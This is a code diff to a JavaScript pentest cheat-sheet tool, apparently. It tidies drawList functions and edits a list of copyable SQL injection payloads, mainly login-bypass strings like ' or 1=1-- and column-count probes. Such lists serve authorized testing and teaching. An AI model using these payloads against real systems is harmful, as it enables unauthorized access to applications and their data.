@@ -587,7 +587,7 @@ class Osint extends MyTool {
     ];
   }
 
-  drawList(index, targetContent, rhost, query) {
+  drawList(index, targetContent, rhost) {
     for (let i = 0; i < targetContent.length; i++) {
       const content = targetContent[i];
       let title = content.title;
@@ -649,9 +649,9 @@ class SqlInj extends MyTool {
       {'title': '1. sql - auth bypass', 'cmd': `' or 'x'='x`},
       {'title': '1. sql - auth bypass', 'cmd': `') or ('x')=('x`},
       {'title': '1. sql - auth bypass', 'cmd': `')) or (('x'))=(('x`},
-      {'title': '1. sql - auth bypass', 'cmd': `or 1=1-- `},
+      {'title': '1. sql - auth bypass', 'cmd': `1 or 1=1-- `},
       {'title': '1. sql - auth bypass', 'cmd': `' or 1=1-- `},
-      {'title': '1. sql - auth bypass', 'cmd': `') or 1=1--`},
+      {'title': '1. sql - auth bypass', 'cmd': `') or 1=1-- `},
       {'title': '1. sql - auth bypass', 'cmd': `1/**/or/**/1=1/**/--`},
       {'title': '2. sql - table columns number', 'cmd': `') order by 1 -- `},
       {'title': '2. sql - determine table columns count', 'cmd': `') order by 2 -- `},
@@ -670,19 +670,16 @@ class SqlInj extends MyTool {
     ];
   }
 
-  drawList(index, targetContent, lhost, lport) {
+  drawList(index, targetContent) {
     for (let i = 0; i < targetContent.length; i++) {
       const content = targetContent[i];
       let title = content.title;
       let cmd = content.cmd;
-      // cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
-      // cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
-      // Template
       if (content.base64) {
         // base64デコードする
         cmd = atob(content.base64);
       }
-
+      // Template
       $(this.targetCSSSelectors[index]).append(`
       <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
         <div class="ms-2 me-auto" style="width: 80%">
